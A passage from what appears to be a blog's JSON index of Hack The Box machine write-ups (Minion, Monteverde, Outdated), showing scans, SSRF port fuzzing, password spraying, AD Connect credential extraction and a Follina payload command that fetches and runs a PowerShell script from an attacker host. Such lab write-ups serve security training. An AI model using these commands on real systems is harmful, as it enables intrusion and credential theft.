(10.10.10.52) Host is up (0.12s latency). Not shown: 65508 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1337/tcp open waste 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5722/tcp open msdfsr 8080/tcp open http-proxy 9389/tcp open adws 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49161/tcp open unknown 49165/tcp open unknown 49171/tcp open unknown 50255/tcp open unknown └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,10475,26347,49152,49153,49154,49155,49157,49158,49164,49165,49171,50255 -sC -sV 10.","tags":["HTB","smbmap","smbclient","rcpclient","kerbrute","orchard-cms","mssql","mssqlclient","crackmapexec","ms14-068","kerberos","kinit","golden-ticket","goldenpac","impacket"],"title":"[HTB] Machine: Mantis"},{"categories":null,"contents":"Minion Enumeration nmap └─$ nmap -Pn -p- 10.10.10.57 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 15:16 BST Nmap scan report for 10.10.10.57 Host is up (0.091s latency). Not shown: 65534 filtered ports PORT STATE SERVICE 62696/tcp open unknown ─$ nmap -Pn -p62696 -sC -sV 10.10.10.57 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 16:16 BST Nmap scan report for 10.10.10.57 (10.10.10.57) Host is up (0.093s latency). PORT STATE SERVICE VERSION 62696/tcp open http Microsoft IIS httpd 8.5 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Microsoft-IIS/8.5 | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 1 disallowed entry |_/backend Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Web Server gobuster └─$ gobuster dir -u http://10.10.10.57:62696/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.57:62696/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,asp,aspx [+] Timeout: 10s =============================================================== 2023/09/04 16:21:40 Starting gobuster in directory enumeration mode =============================================================== /test.asp (Status: 200) [Size: 41] /backend (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.57:62696/backend/] /robots.txt (Status: 200) [Size: 33] Foothold http://10.10.10.57:62696/test.asp It says url parameter is missing If enter url of the webserver it returns the same site It\u0026rsquo;s looks like SSRF https://portswigger.net/web-security/ssrf We can try fuzzing and testing for open ports, since test.asp only loads pages from the box Port discovery └─$ wfuzz -u \u0026#34;http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:FUZZ/\u0026#34; -z range,1-65535 --hc 500 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:FUZZ/ Total requests: 65535 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000080: 200 12 L 25 W 323 Ch \u0026#34;80\u0026#34; 000005985: 200 0 L 0 W 0 Ch \u0026#34;5985\u0026#34; 000047001: 200 0 L 0 W 0 Ch \u0026#34;47001\u0026#34; 000062696: 200 13 L 37 W 458 Ch \u0026#34;62696\u0026#34; User Root ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/minion/images/minion.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/minion/","summary":"Minion Enumeration nmap └─$ nmap -Pn -p- 10.10.10.57 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 15:16 BST Nmap scan report for 10.10.10.57 Host is up (0.091s latency). Not shown: 65534 filtered ports PORT STATE SERVICE 62696/tcp open unknown ─$ nmap -Pn -p62696 -sC -sV 10.10.10.57 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 16:16 BST Nmap scan report for 10.10.10.57 (10.10.10.57) Host is up (0.093s latency). PORT STATE SERVICE VERSION 62696/tcp open http Microsoft IIS httpd 8.","tags":["HTB"],"title":"[HTB] Machine: Minion"},{"categories":null,"contents":"Monteverde Enumeration nmap └─$ nmap -Pn -p- 10.10.10.172 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 17:02 BST Nmap scan report for 10.10.10.172 (10.10.10.172) Host is up (0.095s latency). Not shown: 65518 filtered tcp ports (no-response) PORT STATE SERVICE 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49676/tcp open unknown 49697/tcp open unknown 54886/tcp open unknown └─$ nmap -Pn -p88,135,139,389,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.172 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 17:38 BST Nmap scan report for 10.10.10.172 (10.10.10.172) Host is up (0.16s latency). PORT STATE SERVICE VERSION 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-02 16:37:49Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_smb2-security-mode: SMB: Couldn\u0026#39;t find a NetBIOS name that works for the server. Sorry! |_smb2-time: ERROR: Script execution failed (use -d to debug) smb ldap └─$ ldapsearch -H ldap://10.10.10.172 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=MEGABANK,DC=LOCAL namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 Foothold Will dump everything ldapsearch -H ldap://10.10.10.172 -x -b \u0026quot;DC=MEGABANK,DC=LOCAL\u0026quot; └─$ ldapsearch -H ldap://10.10.10.172 -x -b \u0026#34;DC=MEGABANK,DC=LOCAL\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=MEGABANK,DC=LOCAL\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # MEGABANK.LOCAL dn: DC=MEGABANK,DC=LOCAL objectClass: top objectClass: domain objectClass: domainDNS distinguishedName: DC=MEGABANK,DC=LOCAL instanceType: 5 whenCreated: 20200102220515.0Z whenChanged: 20230902160106.0Z subRefs: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL subRefs: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL subRefs: CN=Configuration,DC=MEGABANK,DC=LOCAL uSNCreated: 4099 dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAD3ugOsMvMU+GSt3sotNcxQ== uSNChanged: 77851 name: MEGABANK objectGUID:: dF0ZQW9mmEa6eGdQmEH00A== replUpToDateVector:: AgAAAAAAAAALAAAAAAAAAA97oDrDLzFPhkrd7KLTXMUFcAAAAAAAAHgMH xQDAAAAR5FJQrVN102DFng19yhewBEwAQAAAAAAQO0DGwMAAAAwI/VDJY7GTL9LbBrQc6myECABAA AAAABJ0GoZAwAAADOghEir6oNEsvEJ9u8wjngKwAAAAAAAALHzHxQDAAAATEU0VTJDIUOpC+muz1W GHAzgAAAAAAAAFc0jFAMAAABlUzJYUqlcQa1wRtRT7+pYCbAAAAAAAAAH5x8UAwAAAF7963Yf1ZpM jnEppodbjcsOAAEAAAAAAE3OshYDAAAAhz8WkG49/0eslA/vS3oKjgeQAAAAAAAA5BYfFAMAAAAPn /fkzuNaRKsJOojPyQTJBoAAAAAAAAA5Ex8UAwAAAKdfSfADqmJLvDeHFzYjcqcL0AAAAAAAALqZIx QDAAAASULD+GgHQU+OAWPs7IQ4IQ8QAQAAAAAAYz1oGQMAAAA= creationTime: 133381440661787842 forceLogoff: -9223372036854775808 lockoutDuration: -18000000000 lockOutObservationWindow: -18000000000 lockoutThreshold: 0 maxPwdAge: -36288000000000 minPwdAge: -864000000000 minPwdLength: 7 modifiedCountAtLastProm: 0 ... We can also use rpcclient https://www.hackingarticles.in/active-directory-enumeration-rpcclient/ https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration └─$ rpcclient -U \u0026#34;\u0026#34; -N 10.10.10.172 rpcclient $\u0026gt; enumdomusers user:[Guest] rid:[0x1f5] user:[AAD_987d7f2f57d2] rid:[0x450] user:[mhope] rid:[0x641] user:[SABatchJobs] rid:[0xa2a] user:[svc-ata] rid:[0xa2b] user:[svc-bexec] rid:[0xa2c] user:[svc-netapp] rid:[0xa2d] user:[dgalanos] rid:[0xa35] user:[roleary] rid:[0xa36] user:[smorgan] rid:[0xa37] rpcclient $\u0026gt; querydispinfo index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2 Name: AAD_987d7f2f57d2 Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos Name: Dimitris Galanos Desc: (null) index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope Name: Mike Hope Desc: (null) index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary Name: Ray O\u0026#39;Leary Desc: (null) index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs Name: SABatchJobs Desc: (null) index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan Name: Sally Morgan Desc: (null) index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata Name: svc-ata Desc: (null) index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec Name: svc-bexec Desc: (null) index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp Name: svc-netapp Desc: (null) No more information we could retrieve So we might try password spraying using crackmapexec First, we will try using usernames as passwords Then we might need to create different password list using names combinations CeWL └─$ crackmapexec smb 10.10.10.172 -u users.list -p users.list SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\\mhope:mhope STATUS_LOGON_FAILURE SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\\mhope:SABatchJobs STATUS_LOGON_FAILURE SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\\mhope:svc-ata STATUS_LOGON_FAILURE SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\\mhope:svc-bexec STATUS_LOGON_FAILURE SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\\mhope:svc-netapp STATUS_LOGON_FAILURE SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\\mhope:dgalanos STATUS_LOGON_FAILURE SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\\mhope:roleary STATUS_LOGON_FAILURE SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\\mhope:smorgan STATUS_LOGON_FAILURE SMB 10.10.10.172 445 MONTEVERDE [-] MEGABANK.LOCAL\\SABatchJobs:mhope STATUS_LOGON_FAILURE SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK.LOCAL\\SABatchJobs:SABatchJobs Now let\u0026rsquo;s enumerate smb └─$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs [+] IP: 10.10.10.172:445 Name: 10.10.10.172 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin azure_uploads READ ONLY C$ NO ACCESS Default share E$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share users$ READ ONLY └─$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R users$ [+] IP: 10.10.10.172:445 Name: 10.10.10.172 Disk Permissions Comment ---- ----------- ------- users$ READ ONLY .\\users$\\* dr--r--r-- 0 Fri Jan 3 13:12:48 2020 . dr--r--r-- 0 Fri Jan 3 13:12:48 2020 .. dr--r--r-- 0 Fri Jan 3 13:15:23 2020 dgalanos dr--r--r-- 0 Fri Jan 3 13:41:18 2020 mhope dr--r--r-- 0 Fri Jan 3 13:14:56 2020 roleary dr--r--r-- 0 Fri Jan 3 13:14:28 2020 smorgan .\\users$\\mhope\\* dr--r--r-- 0 Fri Jan 3 13:41:18 2020 . dr--r--r-- 0 Fri Jan 3 13:41:18 2020 .. fw--w--w-- 1212 Fri Jan 3 14:59:24 2020 azure.xml Let\u0026rsquo;s get azure.xml from mhope\u0026rsquo;s directory └─$ smbclient -U SABatchJobs //10.10.10.172/users$ --password \u0026#39;SABatchJobs\u0026#39; azure.xml Looks like we have a password └─$ cat azure.xml ��\u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;DT N=\u0026#34;StartDate\u0026#34;\u0026gt;2020-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; \u0026lt;DT N=\u0026#34;EndDate\u0026#34;\u0026gt;2054-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; \u0026lt;G N=\u0026#34;KeyId\u0026#34;\u0026gt;00000000-0000-0000-0000-000000000000\u0026lt;/G\u0026gt; \u0026lt;S N=\u0026#34;Password\u0026#34;\u0026gt;4n0therD4y@n0th3r$\u0026lt;/S\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; Let\u0026rsquo;s check it via crackmapexec └─$ crackmapexec smb 10.10.10.172 -u mhope -p \u0026#39;4n0therD4y@n0th3r$\u0026#39; SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK.LOCAL\\mhope:4n0therD4y@n0th3r$ └─$ crackmapexec winrm 10.10.10.172 -u mhope -p \u0026#39;4n0therD4y@n0th3r$\u0026#39; SMB 10.10.10.172 5985 MONTEVERDE [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) HTTP 10.10.10.172 5985 MONTEVERDE [*] http://10.10.10.172:5985/wsman WINRM 10.10.10.172 5985 MONTEVERDE [+] MEGABANK.LOCAL\\mhope:4n0therD4y@n0th3r$ (Pwn3d!) We can evil-winrm By the way, we could\u0026rsquo;ve also checked the domain information using bloodhound-python bloodhound-python -c all -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -ns 10.10.10.172 --zip Root mhope user *Evil-WinRM* PS C:\\Users\\mhope\\Documents\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled *Evil-WinRM* PS C:\\Users\\mhope\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group MEGABANK\\Azure Admins Group S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 We see Azure Admins group We also saw azure_uploads share Let\u0026rsquo;s check everything Azure-related *Evil-WinRM* PS C:\\Program files\u0026gt; ls *Azure* Directory: C:\\Program files Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 1/2/2020 2:51 PM Microsoft Azure Active Directory Connect d----- 1/2/2020 3:37 PM Microsoft Azure Active Directory Connect Upgrader d----- 1/2/2020 3:02 PM Microsoft Azure AD Connect Health Sync Agent d----- 1/2/2020 2:53 PM Microsoft Azure AD Sync Okay, we have a Azure AD Connect https://blog.xpnsec.com/azuread-connect-for-redteam/ We can use the following powershell script We only need to modify connection parameters like in https://sqladm.in/posts/how_to_connect_to_sql_with_powershell/ Write-Host \u0026#34;AD Connect Sync Credential Extract POC (@_xpn_)`n\u0026#34; $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True\u0026#34; $client.Open() $cmd = $client.CreateCommand() ... Let\u0026rsquo;s run the poc Administrator:d0m@in4dminyeah! Now let\u0026rsquo;s get our flag ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/monteverde/images/monteverde.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/monteverde/","summary":"Monteverde Enumeration nmap └─$ nmap -Pn -p- 10.10.10.172 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 17:02 BST Nmap scan report for 10.10.10.172 (10.10.10.172) Host is up (0.095s latency). Not shown: 65518 filtered tcp ports (no-response) PORT STATE SERVICE 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49676/tcp open unknown 49697/tcp open unknown 54886/tcp open unknown └─$ nmap -Pn -p88,135,139,389,464,593,636,3268,3269,5985,9389 -sC -sV 10.","tags":["HTB","active-directory","smb","smbclient","smbmap","rpc","rpcclient","crackmapexec","password-spray","azure-active-directory","evil-winrm","azure-connect","powershell","sqlcmd","mssql","ldapsearch","bloodhound"],"title":"[HTB] Machine: Monteverde"},{"categories":null,"contents":"Outdated Enumeration nmap └─$ nmap -Pn -p- 10.10.11.175 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 20:50 BST Nmap scan report for 10.10.11.175 (10.10.11.175) Host is up (0.16s latency). Not shown: 65513 filtered tcp ports (no-response) PORT STATE SERVICE 25/tcp open smtp 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 8530/tcp open unknown 8531/tcp open unknown 9389/tcp open adws 49667/tcp open unknown 49685/tcp open unknown 49686/tcp open unknown 49689/tcp open unknown 49928/tcp open unknown 52597/tcp open unknown └─$ nmap -Pn -p25,53,88,135,139,143,389,445,464,587,593,636,2179,3268,3269,5985,8530,8531,9389 -sC -sV 10.10.11.175 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 21:06 BST Nmap scan report for 10.10.11.175 (10.10.11.175) Host is up (0.18s latency). PORT STATE SERVICE VERSION 25/tcp open smtp hMailServer smtpd | smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-05 03:05:47Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 143/tcp filtered imap 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-05T03:07:12+00:00; +6h59m24s from scanner time. | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-09-05T02:40:55 |_Not valid after: 2024-09-04T02:40:55 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 587/tcp filtered submission 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-05T03:07:13+00:00; +6h59m24s from scanner time. | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-09-05T02:40:55 |_Not valid after: 2024-09-04T02:40:55 2179/tcp filtered vmrdp 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-05T03:07:12+00:00; +6h59m24s from scanner time. | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-09-05T02:40:55 |_Not valid after: 2024-09-04T02:40:55 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-05T03:07:12+00:00; +6h59m24s from scanner time. | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-09-05T02:40:55 |_Not valid after: 2024-09-04T02:40:55 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8530/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\u0026#39;t have a title. | http-methods: |_ Potentially risky methods: TRACE 8531/tcp open unknown 9389/tcp open mc-nmf .NET Message Framing Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2023-09-05T03:06:37 |_ start_date: N/A |_clock-skew: mean: 6h59m23s, deviation: 0s, median: 6h59m23s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 99.07 seconds smb └─$ smbclient -N -L //10.10.11.175 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share UpdateServicesPackages Disk A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system. WsusContent Disk A network share to be used by Local Publishing to place published content on this WSUS system. WSUSTemp Disk A network share used by Local Publishing from a Remote WSUS Console Instance. Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available smtp └─$ nmap -Pn -p25 10.10.11.175 -T4 --script=smtp* Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 16:49 BST NSE: [smtp-brute] usernames: Time limit 5m00s exceeded. NSE: [smtp-brute] usernames: Time limit 5m00s exceeded. NSE: [smtp-brute] passwords: Time limit 5m00s exceeded. Nmap scan report for dc.outdated.htb (10.10.11.175) Host is up (0.092s latency). PORT STATE SERVICE 25/tcp open smtp | smtp-enum-users: |_ Couldn\u0026#39;t perform user enumeration, authentication needed | smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY | smtp-brute: | Accounts: No valid accounts found |_ Statistics: Performed 4290 guesses in 301 seconds, average tps: 13.7 | smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE |_smtp-open-relay: Server isn\u0026#39;t an open relay, authentication needed Foothold smb └─$ smbclient -N //10.10.11.175/Shares Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Jun 20 16:01:33 2022 .. D 0 Mon Jun 20 16:01:33 2022 NOC_Reminder.pdf AR 106977 Mon Jun 20 16:00:32 2022 9116415 blocks of size 4096. 2055504 blocks available smb: \\\u0026gt; get NOC_Reminder.pdf getting file \\NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (68.5 KiloBytes/sec) (average 68.5 KiloBytes/sec) smb: \\\u0026gt; exit The content of pdf We have a bunch of CVEs CVE-2022-30190 CVE-2022-30129 CVE-2022-30138 CVE-2022-29130 CVE-2022-29110 When the box was released, only CVE-2022-30190\u0026rsquo;s poc was available So we will solve the box this way John Hammond has a nice video explaining this vulnerability PoC1 PoC2 Based on pdf we see that when we send an email with a link, it will be added to monitoring system (probably will be visited) To test it let\u0026rsquo;s launch a web server and send an email with the link to it └─$ swaks --to itsupport@outdated.htb --from \u0026#34;pentester@mail.htb\u0026#34; --header \u0026#34;Subject:Internal Web App\u0026#34; --body \u0026#34;http://10.10.16.5\u0026#34; === Trying outdated.htb:25... === Connected to outdated.htb. \u0026lt;- 220 mail.outdated.htb ESMTP -\u0026gt; EHLO kali \u0026lt;- 250-mail.outdated.htb \u0026lt;- 250-SIZE 20480000 \u0026lt;- 250-AUTH LOGIN \u0026lt;- 250 HELP -\u0026gt; MAIL FROM:\u0026lt;pentester@mail.htb\u0026gt; \u0026lt;- 250 OK -\u0026gt; RCPT TO:\u0026lt;itsupport@outdated.htb\u0026gt; \u0026lt;- 250 OK -\u0026gt; DATA \u0026lt;- 354 OK, send. -\u0026gt; Date: Tue, 05 Sep 2023 17:52:08 +0100 -\u0026gt; To: itsupport@outdated.htb -\u0026gt; From: pentester@mail.htb -\u0026gt; Subject:Internal Web App -\u0026gt; Message-Id: \u0026lt;20230905175208.101414@kali\u0026gt; -\u0026gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/ -\u0026gt; -\u0026gt; http://10.10.16.5 -\u0026gt; -\u0026gt; -\u0026gt; . \u0026lt;- 250 Queued (10.328 seconds) -\u0026gt; QUIT \u0026lt;- 221 goodbye === Connection closed with remote host. └─$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.175 - - [05/Sep/2023 17:52:25] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - So now we need to generate the a html payload I used PoC python3 follina.py/follina.py -t rtf -m command \u0026quot;IEX(New-Object Net.Webclient).DownloadString('http://10.10.16.5/shell.ps1')\u0026quot; -u 10.10.16.5 -p 80 I placed shell.ps1 in the same directory └─$ python3 ./follina.py -t rtf -m command -c \u0026#34;IEX(New-Object 